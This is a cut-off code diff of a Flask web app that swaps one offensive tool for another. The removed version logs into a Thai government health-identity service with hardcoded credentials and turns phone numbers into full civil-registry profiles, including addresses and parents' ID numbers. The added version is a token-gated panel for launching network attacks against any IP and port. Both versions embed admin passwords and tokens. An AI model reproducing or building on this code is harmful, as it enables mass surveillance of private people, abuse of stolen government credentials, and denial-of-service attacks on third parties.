@@ -1,365 +1,476 @@
-import requests
-import re
-import urllib3
-import threading
-import time
-import secrets
-from datetime import datetime, timedelta
 from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ==========================================
-# ⚙️ 1. CONFIGURATION
-# ==========================================
-NHSO_USERNAME = '520186617209'
-NHSO_PASSWORD = 'h12345'
-ADMIN_PASSWORD = 'xaingrung_admin'
+import requests
+import logging
+import secrets
+import time
 
 app = Flask(__name__)
-app.secret_key = secrets.token_hex(32)
-tokens_db = {}
+app.secret_key = secrets.token_hex(16) # คีย์สำหรับระบบ Session
 
-# ==========================================
-# 🛡️ 2. API CLIENTS
-# ==========================================
-class TrueAPIClient:
-    def __init__(self):
-        self.base_url = "https://apitu.psnw.xyz/index.php?type=phone&value={value}&mode=sff"
-    def search(self, query):
-        clean_input = re.sub(r'\D', '', str(query))
-        try:
-            resp = requests.get(self.base_url.format(value=clean_input), timeout=10, verify=False)
-            return resp.json() if resp.status_code == 200 else None
-        except: return None
+# เก็บ Token ในหน่วยความจำ (ในใช้งานจริงควรเก็บลงไฟล์หรือ Database)
+# รูปแบบ: {"token_value": expiry_timestamp}
+valid_tokens = {"ADMIN-XAINRUNG-999": time.time() + 86400} 
 
-class NHSOAuthClient:
-    def __init__(self):
-        self.session = requests.Session()
-        self.base_url = 'https://iam.nhso.go.th'
-        self.api_url = 'https://authenservice.nhso.go.th'
-        self.is_authenticated = False
-    def login(self):
-        try:
-            auth_url = f'{self.base_url}/realms/nhso/protocol/openid-connect/auth'
-            params = {'response_type': 'code', 'client_id': 'authencode', 'scope': 'openid profile', 'redirect_uri': f'{self.api_url}/authencode/login/oauth2/code/authencode'}
-            resp = self.session.get(auth_url, params=params, allow_redirects=True, timeout=15, verify=False)
-            s = re.search(r'session_code=([^&"]+)', resp.text); e = re.search(r'execution=([^&"]+)', resp.text); t = re.search(r'tab_id=([^&"]+)', resp.text)
-            if not all([s, e, t]): return False
-            login_data = {'username': NHSO_USERNAME, 'password': NHSO_PASSWORD, 'credentialId': ''}
-            resp = self.session.post(f'{self.base_url}/realms/nhso/login-actions/authenticate', 
-                                    params={'session_code': s.group(1), 'execution': e.group(1), 'client_id': 'authencode', 'tab_id': t.group(1)}, 
-                                    data=login_data, allow_redirects=True, verify=False)
-            if 'code=' in resp.url or 'KEYCLOAK_IDENTITY' in self.session.cookies:
-                self.session.get(f'{self.api_url}/authencode/oauth2/authorization/authencode', verify=False)
-                self.is_authenticated = True
-                return True
-            return False
-        except: return False
-    def search_by_pid(self, pid):
-        try:
-            resp = self.session.get(f'{self.api_url}/authencode/api/nch-personal-fund/search-by-pid', params={'pid': pid}, timeout=10, verify=False)
-            return {"success": True, "data": resp.json()} if resp.status_code == 200 else {"success": False}
-        except: return {"success": False}
+# --- WEB INTERFACE (HTML/CSS/JS) ---
+HTML_CODE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XAINRUNG NETWORK | GLOBAL STRIKE SYSTEM</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --primary: #9d4edd; 
+            --primary-bright: #c77dff;
+            --primary-glow: rgba(157, 78, 221, 0.6);
+            --dark-bg: #030105; 
+        }
 
-true_client = TrueAPIClient()
-nhso_client = NHSOAuthClient()
+        body {
+            background-color: var(--dark-bg);
+            color: #d1d5db;
+            font-family: 'JetBrains Mono', monospace;
+            overflow: hidden;
+            margin: 0;
+            height: 100vh;
+        }
 
-def background_relogin():
-    while True:
-        nhso_client.login()
-        time.sleep(25 * 60)
-threading.Thread(target=background_relogin, daemon=True).start()
+        /* พื้นหลังอวกาศ (Starfield) */
+        #space-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle at center, #120521 0%, #030105 100%);
+        }
+        
+        .star {
+            position: absolute; background: white; border-radius: 50%;
+            opacity: 0.3; animation: move-stars linear infinite;
+        }
+        @keyframes move-stars { from { transform: translateY(0); } to { transform: translateY(-100vh); } }
 
-# ==========================================
-# 🏛️ 3. NEW SOPHISTICATED NEON STYLE
-# ==========================================
-OFFICIAL_STYLE = """
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Sarabun:wght@300;400;700&family=Orbitron:wght@500;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-<style>
-    :root { 
-        --bg: #050508; 
-        --card-bg: #0d0d15;
-        --accent: #00d2ff; 
-        --accent-red: #ff003c;
-        --text: #e0e0e0;
-        --glow: 0 0 20px rgba(0, 210, 255, 0.4);
-    }
-    
-    body { background: var(--bg); color: var(--text); font-family: 'Inter', 'Sarabun', sans-serif; margin: 0; overflow-x: hidden; }
+        .header-font { font-family: 'Orbitron', sans-serif; }
 
-    /* Login & Landing Transitions */
-    .fade-in { animation: fadeIn 0.8s ease-out; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* หน้า Home/Login - ปรับขนาดไหญ่พอดีหน้าจอ */
+        .hero-title {
+            font-size: clamp(4rem, 12vw, 9rem);
+            line-height: 0.85;
+            text-shadow: 0 0 40px var(--primary-glow), 0 0 80px var(--primary-glow);
+            letter-spacing: -4px;
+        }
 
-    /* New Login Style */
-    .login-container { height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at center, #101020 0%, #050508 100%); }
-    .auth-box { background: var(--card-bg); padding: 50px; border-radius: 20px; border: 1px solid rgba(0, 210, 255, 0.1); width: 100%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
-    .auth-box::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(45deg, transparent, var(--accent), transparent, var(--accent-red)); border-radius: 22px; z-index: -1; opacity: 0.3; }
-    .brand-title { font-family: 'Orbitron'; font-size: 28px; letter-spacing: 5px; margin-bottom: 5px; color: #fff; text-shadow: var(--glow); }
-    
-    /* Landing Mode Selector */
-    .landing-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; padding: 40px; max-width: 900px; margin: 100px auto; }
-    .mode-btn { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.05); padding: 60px 20px; border-radius: 25px; cursor: pointer; transition: 0.4s; text-align: center; text-decoration: none; color: inherit; position: relative; overflow: hidden; }
-    .mode-btn i { font-size: 50px; margin-bottom: 20px; color: var(--accent); transition: 0.4s; }
-    .mode-btn:hover { transform: translateY(-10px); border-color: var(--accent); box-shadow: var(--glow); }
-    .mode-btn:hover i { transform: scale(1.2); text-shadow: var(--glow); }
-    .mode-btn h2 { font-family: 'Orbitron'; font-size: 18px; margin: 0; letter-spacing: 2px; }
+        .btn-enter {
+            border: 2px solid var(--primary);
+            background: rgba(157, 78, 221, 0.05);
+            color: var(--primary-bright);
+            padding: 1.5rem 4rem;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 10px;
+            position: relative;
+            transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            overflow: hidden;
+            box-shadow: inset 0 0 20px var(--primary-glow);
+            font-size: 1.2rem;
+        }
+        .btn-enter:hover {
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 0 60px var(--primary-glow);
+            transform: scale(1.1);
+        }
 
-    /* International ID Card Result Style */
-    .id-card { background: linear-gradient(135deg, #1a1a2e 0%, #0d0d15 100%); border-radius: 20px; border: 1px solid rgba(0,210,255,0.2); margin-bottom: 30px; position: relative; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.4); }
-    .id-card-header { background: rgba(0, 210, 255, 0.1); padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
-    .id-card-body { padding: 30px; display: flex; gap: 30px; }
-    .id-photo { width: 140px; height: 180px; background: #050508; border: 2px solid var(--accent); border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; }
-    .id-photo::after { content: 'PERSONAL DATA'; position: absolute; bottom: 5px; font-size: 8px; color: var(--accent); }
-    .id-details { flex-grow: 1; display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
-    .data-item { border-bottom: 1px solid rgba(255,255,255,0.03); padding-bottom: 5px; }
-    .data-label { font-size: 10px; color: var(--accent); text-transform: uppercase; font-weight: 600; }
-    .data-value { font-size: 16px; color: #fff; margin-top: 3px; font-weight: 400; }
-    .full-width { grid-column: span 2; }
+        /* หน้า GUI การยิง */
+        .glass-panel {
+            background: rgba(10, 5, 25, 0.8);
+            border: 1px solid rgba(157, 78, 221, 0.4);
+            backdrop-filter: blur(30px);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 
+                        inset 0 0 30px rgba(157, 78, 221, 0.1);
+            position: relative;
+        }
+        
+        .glass-panel::after {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-bright), transparent);
+        }
 
-    /* Navbar */
-    .nav { height: 70px; background: rgba(5,5,8,0.9); backdrop-filter: blur(10px); display: flex; align-items: center; padding: 0 50px; border-bottom: 1px solid rgba(0,210,255,0.2); position: sticky; top: 0; z-index: 100; }
-    .search-bar-container { max-width: 800px; margin: 40px auto; padding: 0 20px; }
-    .custom-input { width: 100%; background: #111; border: 1px solid #333; padding: 18px 25px; border-radius: 50px; color: #fff; font-size: 18px; transition: 0.3s; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5); }
-    .custom-input:focus { outline: none; border-color: var(--accent); box-shadow: var(--glow); }
+        .cyber-input {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(157, 78, 221, 0.3);
+            box-shadow: inset 0 0 15px rgba(0, 0, 0, 1);
+            color: #fff;
+            transition: 0.3s;
+        }
+        .cyber-input:focus {
+            border-color: var(--primary-bright);
+            box-shadow: 0 0 25px var(--primary-glow);
+            outline: none;
+        }
 
-    .btn-search { background: var(--accent); color: #000; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px; transition: 0.3s; font-family: 'Orbitron'; width: 100%; }
-    .btn-search:hover { transform: scale(1.02); box-shadow: var(--glow); }
+        .btn-strike {
+            background: linear-gradient(135deg, #7b2cbf, #9d4edd);
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px var(--primary-glow);
+            transition: 0.4s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .btn-strike:hover {
+            filter: brightness(1.3);
+            box-shadow: 0 0 50px var(--primary-glow);
+            transform: translateY(-3px);
+        }
 
-    .footer-bar { position: fixed; bottom: 0; width: 100%; height: 5px; background: linear-gradient(90deg, var(--accent-red), var(--accent), var(--accent-red)); }
-</style>
+        .ship-bg {
+            position: absolute;
+            bottom: -10%; left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 1200px;
+            opacity: 0.15;
+            filter: grayscale(1) invert(1) drop-shadow(0 0 100px var(--primary));
+            pointer-events: none;
+            z-index: 0;
+            animation: ship-float 10s ease-in-out infinite;
+        }
+        @keyframes ship-float {
+            0%, 100% { transform: translate(-50%, 0) rotate(0deg); }
+            50% { transform: translate(-50%, -40px) rotate(1deg); }
+        }
+
+        .glow-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, transparent 20%, rgba(10, 2, 20, 0.9) 100%);
+            pointer-events: none;
+        }
+
+        .home-menu {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            z-index: 100;
+        }
+        .btn-home {
+            background: rgba(157, 78, 221, 0.1);
+            border: 1px solid var(--primary);
+            color: var(--primary-bright);
+            padding: 0.75rem 1.5rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            transition: 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        .btn-home:hover {
+            background: var(--primary);
+            color: white;
+            box-shadow: 0 0 20px var(--primary-glow);
+        }
+
+        .page { transition: 1s cubic-bezier(0.19, 1, 0.22, 1); }
+        .hidden { display: none !important; opacity: 0; transform: scale(1.1); }
+        
+        /* สไตล์พิเศษสำหรับหน้า Login */
+        .login-box {
+            max-width: 500px;
+            width: 90%;
+            padding: 3rem;
+            border-radius: 20px;
+            border: 1px solid rgba(157, 78, 221, 0.5);
+            background: rgba(10, 5, 20, 0.9);
+            backdrop-filter: blur(20px);
+            box-shadow: 0 0 50px rgba(157, 78, 221, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <div id="space-bg"></div>
+    <div class="glow-overlay"></div>
+
+    <section id="login-page" class="page min-h-screen flex flex-col items-center justify-center p-6 text-center">
+        <div class="login-box relative z-10">
+            <h2 class="header-font text-2xl font-black text-purple-500 mb-2 tracking-tighter uppercase italic">Secure Access</h2>
+            <p class="text-[10px] text-zinc-500 mb-8 tracking-[0.3em] uppercase">Enter Authorization Token</p>
+            
+            <div class="space-y-6">
+                <input type="password" id="token-input" placeholder="XR-XXXX-XXXX-XXXX" 
+                       class="cyber-input w-full p-4 rounded-lg text-center tracking-[0.5em] font-bold text-purple-300">
+                <button onclick="verifyToken()" class="btn-strike w-full py-4 rounded-xl text-white font-black tracking-widest">
+                    VERIFY IDENTITY
+                </button>
+                <p id="login-error" class="text-red-500 text-[10px] font-bold uppercase mt-4 hidden">!! Invalid or Expired Token !!</p>
+            </div>
+        </div>
+        <div class="mt-12 text-purple-900 font-black text-[10px] uppercase tracking-[0.5em] opacity-30">
+            XAINRUNG NETWORK | ENCRYPTED GATEWAY
+        </div>
+    </section>
+
+    <section id="home-page" class="page hidden min-h-screen flex flex-col items-center justify-center p-6 text-center">
+        <div class="relative z-10">
+            <p class="header-font text-purple-400 tracking-[2em] text-[12px] mb-8 font-black opacity-80">STRIKE SYSTEM ONLINE</p>
+            <h1 class="hero-title header-font font-black text-white italic uppercase">
+                XAINRUNG<br><span class="text-purple-600">STRIKE</span>
+            </h1>
+            <div class="mt-16">
+                <button onclick="showPage('console')" class="btn-enter">
+                    INITIATE ACCESS
+                </button>
+            </div>
+            <div class="mt-32 grid grid-cols-3 gap-12 text-purple-900 font-black text-[11px] uppercase tracking-[0.4em] opacity-40">
+                <div>// NODE_X1</div>
+                <div>// 84.21.173.208</div>
+                <div>// ENCRYPTED</div>
+            </div>
+        </div>
+    </section>
+
+    <section id="console-page" class="page hidden min-h-screen p-8 md:p-16">
+        <div class="home-menu">
+            <button onclick="showPage('home')" class="btn-home uppercase">
+                Return to Hub
+            </button>
+        </div>
+
+        <img src="https://www.pngall.com/wp-content/uploads/5/Spaceship-PNG-Free-Download.png" class="ship-bg">
+        
+        <div class="max-w-[1600px] mx-auto relative z-10 h-full flex flex-col">
+            <header class="flex justify-between items-end mb-16">
+                <div>
+                    <h2 class="header-font text-5xl font-black text-white italic tracking-tighter">
+                        CORE.<span class="text-purple-600">TERMINAL</span>
+                    </h2>
+                    <div class="h-1.5 w-32 bg-purple-600 mt-4 shadow-[0_0_15px_#9d4edd]"></div>
+                </div>
+                <div class="text-right hidden md:block">
+                    <p class="text-[10px] text-zinc-500 tracking-[0.5em] uppercase font-bold">System Status</p>
+                    <p class="text-green-500 font-bold text-xs uppercase animate-pulse">● Connected to Nebula</p>
+                </div>
+            </header>
+
+            <div class="grid grid-cols-12 gap-12 flex-grow">
+                <div class="col-span-12 lg:col-span-4 space-y-8">
+                    <div class="glass-panel p-10 rounded-2xl border-r-8 border-r-purple-600">
+                        <h3 class="header-font text-md mb-10 text-purple-400 font-black tracking-[0.3em] uppercase italic border-b border-purple-900 pb-6">Target Configuration</h3>
+                        <div class="space-y-8">
+                            <div>
+                                <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Target IP / URL</label>
+                                <input id="host" type="text" placeholder="0.0.0.0" class="cyber-input w-full p-5 rounded-lg text-lg font-bold">
+                            </div>
+                            <div class="grid grid-cols-2 gap-6">
+                                <div>
+                                    <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Port</label>
+                                    <input id="port" type="text" placeholder="80" class="cyber-input w-full p-5 rounded-lg text-lg">
+                                </div>
+                                <div>
+                                    <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Time</label>
+                                    <input id="time" type="text" placeholder="60" class="cyber-input w-full p-5 rounded-lg text-lg">
+                                </div>
+                            </div>
+                            <div>
+                                <label class="text-[10px] text-zinc-400 block mb-3 tracking-widest uppercase font-bold">Attack Method</label>
+                                <input id="method" type="text" placeholder="GUDP" class="cyber-input w-full p-5 rounded-lg text-lg uppercase font-black">
+                            </div>
+                            <button onclick="executeAttack()" class="btn-strike w-full py-7 rounded-xl text-white text-lg tracking-[0.3em]">
+                                Launch Attack
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-span-12 lg:col-span-8">
+                    <div class="glass-panel h-[650px] rounded-2xl flex flex-col overflow-hidden">
+                        <div class="p-6 bg-purple-950/40 flex justify-between items-center px-10 border-b border-purple-900/50">
+                            <span class="header-font text-[11px] font-black text-purple-300 tracking-[0.4em] uppercase">Quantum Payload Traffic</span>
+                            <div class="flex gap-3">
+                                <span class="w-3 h-3 rounded-full bg-purple-500 shadow-[0_0_10px_#9d4edd]"></span>
+                            </div>
+                        </div>
+                        <div id="terminal" class="p-10 font-mono text-[14px] overflow-y-auto space-y-3 flex-grow text-zinc-400">
+                            <p class="text-purple-500 font-black">> [SYS] BOOT_SEQUENCE_COMPLETE</p>
+                            <p class="text-zinc-600">> [SYS] AWAITING_AUTHORIZATION_KEY...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // Starfield Generator
+        const bg = document.getElementById('space-bg');
+        for (let i = 0; i < 200; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            const size = Math.random() * 2.5 + 1;
+            star.style.width = size + 'px';
+            star.style.height = size + 'px';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDuration = (Math.random() * 5 + 5) + 's';
+            star.style.opacity = Math.random();
+            bg.appendChild(star);
+        }
+
+        async function verifyToken() {
+            const token = document.getElementById('token-input').value;
+            const res = await fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token })
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                showPage('home');
+            } else {
+                const err = document.getElementById('login-error');
+                err.classList.remove('hidden');
+                setTimeout(() => err.classList.add('hidden'), 3000);
+            }
+        }
+
+        function showPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
+            document.getElementById(`${page}-page`).classList.remove('hidden');
+        }
+
+        function addLog(msg, type = 'info') {
+            const term = document.getElementById('terminal');
+            const p = document.createElement('p');
+            let color = "text-zinc-400";
+            if(type === 'error') color = "text-red-500 font-black shadow-sm";
+            if(type === 'success') color = "text-purple-400 font-black";
+            p.className = color;
+            p.innerHTML = `<span class="opacity-30 text-[11px]">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            term.appendChild(p);
+            term.scrollTop = term.scrollHeight;
+        }
+
+        async function executeAttack() {
+            const target = document.getElementById('host').value;
+            const port = document.getElementById('port').value;
+            const time = document.getElementById('time').value;
+            const method = document.getElementById('method').value;
+            if(!target || !port) return addLog('!! ERROR: TARGET_DATA_MISSING !!', 'error');
+            addLog(`> INJECTING STRIKE SEQUENCE TO: ${target}`, 'info');
+            try {
+                const response = await fetch('/api/launch', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, port, time, method })
+                });
+                const data = await response.json();
+                if(data.status === 'success') {
+                    addLog(`> RESPONSE: ${data.message} - ATTACK_LIVE`, 'success');
+                } else {
+                    addLog(`> ALERT: SERVER_REJECTED (${data.message})`, 'error');
+                }
+            } catch (err) {
+                addLog(`> FATAL: QUANTUM_LINK_FAIL`, 'error');
+            }
+        }
+
+        // ตรวจสอบ Session เมื่อโหลดหน้าเว็บ
+        window.onload = async () => {
+            const res = await fetch('/api/check_session');
+            const data = await res.json();
+            if(data.logged_in) showPage('home');
+        };
+    </script>
+</body>
+</html>
 """
 
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        tk = request.form.get('token')
-        if tk in tokens_db and datetime.now() < tokens_db[tk]:
-            session['user_token'] = tk
-            return redirect(url_for('landing'))
-    return render_template_string(OFFICIAL_STYLE + """
-    <div class="login-container">
-        <div class="auth-box fade-in">
-            <div class="brand-title">XIANG RUNG</div>
-            <p style="color:rgba(255,255,255,0.4); font-size:12px; letter-spacing:2px; margin-bottom:30px;">SECURE ACCESS GATEWAY</p>
-            <form method="POST">
-                <input type="password" name="token" class="custom-input" placeholder="ENTER ACCESS KEY" style="text-align:center; font-size:14px; margin-bottom:20px;">
-                <button type="submit" class="btn-search">AUTHORIZE</button>
-            </form>
-            <p style="margin-top:30px; font-size:10px; color: #444;">ENCRYPTED END-TO-END CONNECTION</p>
+# --- TOKEN ADMIN PAGE (HTML) ---
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>TOKEN GENERATOR</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+    <style>body{background:#05000a;color:#c77dff;font-family:'Orbitron',sans-serif;}</style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+    <div class="p-10 bg-black border-2 border-purple-500 rounded-xl shadow-[0_0_30px_#9d4edd] text-center max-w-lg w-full">
+        <h1 class="text-2xl font-bold mb-6 italic">TOKEN_ADMIN_PANEL</h1>
+        <form method="POST">
+            <input name="pw" type="password" placeholder="Admin Password" class="w-full bg-zinc-900 border border-purple-900 p-4 mb-4 rounded text-center">
+            <button class="w-full bg-purple-600 p-4 rounded font-bold hover:bg-purple-500 transition">GENERATE NEW TOKEN</button>
+        </form>
+        {% if token %}
+        <div class="mt-8 p-4 bg-purple-950/30 border border-dashed border-purple-400">
+            <p class="text-[10px] text-purple-300">NEW_TOKEN_GENERATED:</p>
+            <p class="text-xl font-black text-white select-all">{{ token }}</p>
+            <p class="text-[8px] text-zinc-500 mt-2">EXPIRES IN: 24 HOURS</p>
         </div>
+        {% endif %}
+        <a href="/" class="block mt-6 text-[10px] underline">Back to Gateway</a>
     </div>
-    <div class="footer-bar"></div>
-    """)
+</body>
+</html>
+"""
 
-@app.route('/portal')
-def landing():
-    tk = session.get('user_token')
-    if not tk or tk not in tokens_db or datetime.now() > tokens_db[tk]:
-        return redirect(url_for('login'))
-    return render_template_string(OFFICIAL_STYLE + """
-    <div class="nav">
-        <div class="brand-title" style="font-size:18px;">XIANG RUNG <span style="color:var(--accent-red)">OS</span></div>
-    </div>
-    <div class="landing-grid fade-in">
-        <a href="/search?mode=phone" class="mode-btn">
-            <i class="fa fa-phone-volume"></i>
-            <h2>PHONE IDENTITY</h2>
-            <p style="font-size:11px; color:#555; margin-top:10px;">ค้นหาตำแหน่งและที่อยู่ผ่านเบอร์โทรศัพท์</p>
-        </a>
-        <a href="/search?mode=pid" class="mode-btn">
-            <i class="fa fa-id-card"></i>
-            <h2>CIVIL DATABASE</h2>
-            <p style="font-size:11px; color:#555; margin-top:10px;">ตรวจสอบฐานข้อมูลทะเบียนราษฎร์ฉบับเต็ม</p>
-        </a>
-    </div>
-    <div class="footer-bar"></div>
-    """)
-
-@app.route('/search')
-def search_page():
-    tk = session.get('user_token')
-    if not tk or tk not in tokens_db or datetime.now() > tokens_db[tk]: return redirect(url_for('login'))
-    mode = request.args.get('mode', 'phone')
-    mode_text = "PHONE TRACER" if mode == 'phone' else "CRIMINAL & CIVIL DB"
-    placeholder = "ป้อนเบอร์โทรศัพท์..." if mode == 'phone' else "ป้อนเลขบัตรประชาชน 13 หลัก..."
-
-    return render_template_string(OFFICIAL_STYLE + f"""
-    <div class="nav">
-        <a href="/portal" style="color:var(--accent); text-decoration:none; margin-right:20px;"><i class="fa fa-arrow-left"></i> BACK</a>
-        <div class="brand-title" style="font-size:18px;">SYSTEM / <span style="color:var(--accent)">{mode_text}</span></div>
-    </div>
-    
-    <div class="search-bar-container fade-in">
-        <input type="text" id="query" class="custom-input" placeholder="{placeholder}">
-        <button class="btn-search" onclick="doSearch()">EXECUTE SEARCH</button>
-    </div>
-
-    <div id="loader" style="display:none; text-align:center; padding:50px;">
-        <i class="fas fa-sync fa-spin" style="font-size:30px; color:var(--accent);"></i>
-        <p style="font-family:'Orbitron'; font-size:12px; margin-top:15px;">DECRYPTING DATABASE RECORDS...</p>
-    </div>
-
-    <div id="results" style="max-width:900px; margin:0 auto; padding-bottom:100px;"></div>
-    
-    <script>
-        async function doSearch() {{
-            const q = document.getElementById('query').value;
-            if(!q) return;
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('results').innerHTML = '';
-            
-            const res = await fetch('/api/search', {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{query: q, mode: '{mode}'}})
-            }});
-            const data = await res.json();
-            document.getElementById('loader').style.display = 'none';
-
-            if(data.results.length === 0) {{
-                document.getElementById('results').innerHTML = '<p style="text-align:center; color:var(--accent-red);">NO RECORDS FOUND IN CENTRAL UNIT</p>';
-                return;
-            }}
-
-            data.results.forEach(p => {{
-                const html = `
-                <div class="id-card fade-in">
-                    <div class="id-card-header">
-                        <span style="font-family:'Orbitron'; font-size:12px;"><i class="fa fa-fingerprint"></i> ${{p.role}}</span>
-                        <span style="font-size:10px; color:var(--accent)">MATCH CONFIDENCE: oza%</span>
-                    </div>
-                    <div class="id-card-body">
-                        <div class="id-photo">
-                            <i class="fa fa-user" style="font-size:60px; color:#222;"></i>
-                        </div>
-                        <div class="id-details">
-                            <div class="data-item">
-                                <div class="data-label">Full Name / ชื่อ-นามสกุล</div>
-                                <div class="data-value" style="font-weight:600; color:var(--accent);">${{p.name}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Personal ID / เลขบัตรประชาชน</div>
-                                <div class="data-value">${{p.pid}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Date of Birth / วันเกิด</div>
-                                <div class="data-value">${{p.birth}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Gender / เพศ</div>
-                                <div class="data-value">${{p.gender}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Blood Type / กรุ๊ปเลือด</div>
-                                <div class="data-value">${{p.blood}}</div>
-                            </div>
-                             <div class="data-item">
-                                <div class="data-label">Religion / ศาสนา</div>
-                                <div class="data-value">${{p.religion}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Occupation / อาชีพ</div>
-                                <div class="data-value">${{p.job}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Card Status / สถานะบัตร</div>
-                                <div class="data-value" style="color:#00ff88">ACTIVE / ปกติ</div>
-                            </div>
-                            <div class="data-item full-width">
-                                <div class="data-label">Registered Address / ที่อยู่ตามทะเบียนราษฎร์</div>
-                                <div class="data-value" style="font-size:14px; line-height:1.5; color:rgba(255,255,255,0.8);">${{p.addr}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Father PID / เลขบัตรบิดา</div>
-                                <div class="data-value" style="color:var(--accent-red)">${{p.father_id}}</div>
-                            </div>
-                            <div class="data-item">
-                                <div class="data-label">Mother PID / เลขบัตรมารดา</div>
-                                <div class="data-value" style="color:var(--accent-red)">${{p.mother_id}}</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>`;
-                document.getElementById('results').innerHTML += html;
-            }});
-        }}
-    </script>
-    """)
+# --- BACKEND LOGIC ---
 
 @app.route('/')
 def index():
-    return redirect(url_for('login'))
+    return render_template_string(HTML_CODE)
 
-@app.route('/api/search', methods=['POST'])
-def api_search():
-    query = request.json.get('query', '')
-    mode = request.json.get('mode', 'phone')
-    clean_query = re.sub(r'\D', '', query)
-    target_pid = clean_query if len(clean_query) == 13 else None
-    
-    if not target_pid:
-        res_true = true_client.search(clean_query)
-        if res_true:
-            try: target_pid = res_true.get('id-number') or res_true.get('pid') or (res_true['results']['response-data']['id-number'] if 'results' in res_true else None)
-            except: pass
-    if not target_pid: return jsonify({"results": []})
+@app.route('/tokenadmin', methods=['GET', 'POST'])
+def token_admin():
+    new_token = None
+    if request.method == 'POST':
+        # รหัสผ่านสำหรับสร้าง token (ตั้งไว้เบื้องต้น)
+        admin_pw = request.form.get('pw')
+        if admin_pw == "XainrungAdmin99": # <--- คุณสามารถเปลี่ยนรหัสตรงนี้ได้
+            token_val = f"XR-{secrets.token_hex(4).upper()}-{secrets.token_hex(4).upper()}"
+            valid_tokens[token_val] = time.time() + 86400 # หมดอายุใน 24 ชม.
+            new_token = token_val
+    return render_template_string(ADMIN_HTML, token=new_token)
 
-    # ส่วนเพิ่มระบบค้นหาเครือญาติสัมพันธ์ (พ่อแม่ปู่ย่าตายาย)
-    queue = [(target_pid, "ข้อมูลเป้าหมายหลัก", 0)]
-    visited = set(); final_results = []
-    
-    while queue and len(final_results) < 20:
